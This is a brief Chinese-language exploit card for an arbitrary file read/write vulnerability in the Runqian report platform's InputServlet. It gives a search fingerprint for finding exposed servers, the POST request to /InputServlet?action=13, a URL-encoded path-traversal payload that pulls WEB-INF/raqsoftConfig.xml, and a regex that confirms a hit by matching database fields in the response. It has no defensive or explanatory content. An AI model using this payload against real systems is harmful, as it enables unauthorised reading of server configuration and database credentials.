# 润乾报表平台InputServlet任意文件读取漏洞

润乾报表平台InputServlet ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="润乾报表"`
- **请求**：`POST /InputServlet?action=13 HTTP/1.1`

**Payload**
```
file=%2F%5C..%5C%5C..%5C%5CWEB-INF%5C%5CraqsoftConfig.xml&upFileName=web.config
```
- **响应特征**：200 ^(?=.*?DB)(?=.*?name).*?$